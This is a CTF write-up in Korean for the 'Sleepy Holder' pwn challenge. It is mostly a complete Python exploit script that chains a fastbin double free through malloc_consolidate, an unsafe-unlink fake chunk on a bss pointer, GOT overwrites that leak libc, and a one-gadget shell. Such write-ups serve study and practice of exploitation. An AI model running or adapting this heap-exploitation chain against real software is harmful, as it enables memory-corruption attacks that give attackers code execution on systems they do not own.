Sleepy Holder - 300 (pwn)
=============

### 1. Introduction

| RELRO         | STACK CANARY | NX         | PIE    | RPATH    | RUNPATH    | FILE  |
|---------------|--------------|------------|--------|----------|------------|-------|
| Partial RELRO | Canary found | NX enabled | No PIE | No RPATH | No RUNPATH | slepy |

64 bit binary이다. malloc consolidate를 이용해서 fastbin을 smallbin에 할당시키게 하는거 까지는 알고있었는데 이걸 free시켜서 문제를 풀도록 유도하다는 문제였다. 히트콘 문제수준은 정말 엄청난거같다.
깨달은 점이 있다면 smallbin chunk, 자유롭게 edit가능, bss에 heap chunk주소 존재 == unsafe unlink!! 라는걸 바로 유추할 수 있도록 해야겠다.


### 2. Exploit
exploit에 세부 설명을 다 넣었다.
```python
from ntpwn import *

s = process('./slepy')
e = ELF('./slepy')
l = ELF("/lib/x86_64-linux-gnu/libc.so.6")
b = BP(s)
b.bp('tracemalloc on')
b.bp('c')
b.done()

def keep(size,secret):
	s.sendlineafter('3. Renew secret\n','1')
	s.sendlineafter('Big secret\n', size)
	s.sendafter('l me your secret:',secret)

def wipe(size):
	s.sendlineafter('3. Renew secret\n','2')
	s.sendlineafter('Big secret\n', size)

def renew(size,secret):
	s.sendlineafter('3. Renew secret\n','3')
	s.sendlineafter('Big secret\n', size)
	s.sendafter('l me your secret:',secret)


pause()
keep('1', "A" * 40) # fastbin size
keep('2', "A" * 40) # to avoid merging with top chunk
wipe('1') # small secret -> fastbin
keep('3', "A" * 40) # unsortedbin -> smallbin

# huge secret -> Allocated.
# big secret -> Allocated.
# small secret -> free

wipe('1') # double free ( -> fastbin )

bss = 0x6020d0
fake_chunk = p64(0) + p64(0x20) + p64(bss - 0x18) + p64(bss - 0x10) + p64(0x20)
keep('1', fake_chunk)

wipe('2') # unsafe unlink attack
keep('2', "A" * 40) # small secret buf -> 0x~~

debug()
renew('1',p64(0) + p64(e.got['free']))
renew('2',p64(e.plt['puts']))
renew('1',p64(0) + p64(e.got['puts']))
wipe('2')
libc_base = u64(s.recv(6) + "\x00" * 2) - l.symbols['puts']
oneshot = libc_base + 0x45216
log.info("LIBC BASE : " + hex(libc_base))

keep('2', "A" * 40) # small secret buf -> 0x~~
renew('1',p64(0) + p64(e.got['puts']))
renew('2',p64(oneshot))

s.interactive()
```
